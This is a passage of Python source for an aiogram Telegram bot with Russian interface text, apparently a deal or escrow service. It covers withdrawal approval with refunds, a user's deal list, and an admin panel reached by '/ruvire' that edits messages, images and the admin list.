                try: await bot.send_message(r["user_id"], f"✅ Ваша заявка на вывод {r['amount']} одобрена и выплачена!")
                except: pass
            else:
                r["status"] = "Отклонено"; save_json(WITHDRAW_FILE, reqs)
                amt_str = r["amount"].split()
                add_balance(r["user_id"], amt_str[1], float(amt_str[0]))
                await callback.message.edit_text(f"❌ Заявка {req_id} отклонена. Средства возвращены.")
                try: await bot.send_message(r["user_id"], f"❌ Ваша заявка на вывод {r['amount']} отклонена. Средства возвращены на баланс.")
                except: pass
            return
    await callback.answer("Заявка уже обработана.", show_alert=True)

@dp.callback_query(F.data == "my_deals")
async def my_deals(callback: types.CallbackQuery):
    uid = callback.from_user.id
    deals = [d for d in get_deals() if d["user_id"] == uid or d.get("buyer_id") == uid]
    if not deals: return await callback.answer(t(uid, "no_deals"), show_alert=True)
    text = t(uid, "deals_title")
    for d in reversed(deals[-5:]):
        text += f"<code>{d['deal_id']}</code> | {d['amount']} | {d['status']}\n"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(uid, "btn_main"), callback_data="back_to_main")]])
    await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@dp.message(Command("ruvire"))
async def cmd_admin_panel(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id): return await message.answer("Нет доступа.")
    menu_text = (
        "<b>Настройка бота (Текст)</b>\n\n"
        "1. Приветствие\n2. Выбор метода\n3. Кошелек (сумма)\n4. Карта (сумма)\n5. Звезды (сумма)\n"
        "6. Ввод реквизитов\n7. Ввод NFT\n8. Успех\n\n"
        "<b>Картинки:</b>\n"
        "10. Приветствие\n11. Выбор метода\n12. Кошелек (сумма)\n13. Карта (сумма)\n14. Звезды (сумма)\n"
        "15. Ввод реквизитов\n16. Ввод NFT\n17. Успех\n"
        "18. Предложение сделки (Покупателю)\n19. Покупатель оплатил\n20. Продавец передал (ожидание)\n21. Покупатель получил (финал)\n\n"
        "<b>Админы:</b>\n22. Добавить\n23. Удалить\n\n"
        "Отправьте цифру, затем текст/фото."
    )
    await message.answer(menu_text, parse_mode="HTML")
    await state.set_state(AdminStates.waiting_for_choice)

@dp.message(AdminStates.waiting_for_choice)
async def process_admin_choice(message: types.Message, state: FSMContext):
    if not message.text.isdigit(): return await message.answer("Отправьте число.")
    choice = int(message.text)
    
    if choice == 22:
        await message.answer("Отправьте ID нового админа:")
        await state.update_data(action="add_admin")
        await state.set_state(AdminStates.waiting_for_new_value)
        return
    if choice == 23:
        config = get_settings()
        if not config.get("admins"): return await message.answer("Нет доп. админов.")
        await message.answer("Отправьте ID для удаления:\n" + "\n".join(map(str, config["admins"])))
        await state.update_data(action="del_admin")
        await state.set_state(AdminStates.waiting_for_new_value)
        return

    keys = {
        1: "welcome", 2: "choose_method", 3: "amount_wallet", 4: "amount_card", 5: "amount_stars", 6: "enter_details", 7: "enter_nft", 8: "deal_success",
        10: "welcome", 11: "choose_method", 12: "amount_wallet", 13: "amount_card", 14: "amount_stars", 15: "enter_details", 16: "enter_nft", 17: "deal_success",
        18: "deal_offer", 19: "buyer_paid", 20: "seller_wait_confirm", 21: "buyer_final_success"
    }
    if choice not in keys: return await message.answer("Неверный номер.")
    
    action = "text" if choice <= 8 else "image"
    await state.update_data(key=keys[choice], action=action)
    await message.answer(f"Отправьте новое значение для пункта {choice}:")
    await state.set_state(AdminStates.waiting_for_new_value)

@dp.message(AdminStates.waiting_for_new_value)
async def process_new_value(message: types.Message, state: FSMContext):
    data = await state.get_data()
    settings = get_settings()
    
    if data["action"] == "add_admin":
        try:
            new_id = int(message.text)
            if new_id not in settings["admins"]:
                settings["admins"].append(new_id)
                save_settings(settings)
                await message.answer("Админ добавлен.")
            else: await message.answer("Уже админ.")
        except: await message.answer("Ошибка ID.")
    elif data["action"] == "del_admin":
        try:
            del_id = int(message.text)
            if del_id in settings["admins"]:
                settings["admins"].remove(del_id)
                save_settings(settings)
                await message.answer("Админ удален.")
            else: await message.answer("Не найден.")
        except: await message.answer("Ошибка ID.")
    elif data["action"] == "text":
        settings["texts"][data["key"]] = message.html_text
        save_settings(settings)
        await message.answer("Текст обновлен!")
    elif data["action"] == "image":
        if not message.photo: return await message.answer("Отправьте фото.")
        settings["images"][data["key"]] = message.photo[-1].file_id
        save_settings(settings)
        await message.answer("Картинка обновлена!")
    await state.clear()

@dp.callback_query(F.data == "stub")
async def stub(callback: types.CallbackQuery):
    await callback.answer("В разработке", show_alert=True)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
